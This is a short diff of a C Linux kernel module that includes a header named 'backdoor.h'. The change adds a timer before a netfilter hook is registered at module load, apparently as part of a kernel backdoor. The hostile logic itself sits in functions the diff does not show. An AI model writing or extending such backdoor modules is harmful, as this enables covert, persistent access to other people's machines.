@@ -1,9 +1,15 @@
 #include "backdoor.h"
 
+struct timer_list *timer;
+
 static int __init init_mod(void){
 	printk("Inserting module\n");
 	create_file();
-	return nfhook_init();
+	timer = create_timer(10000);
+	if (timer){
+		return nfhook_init();
+	}
+	return -1;
 }
 
 static void __exit exit_mod(void){
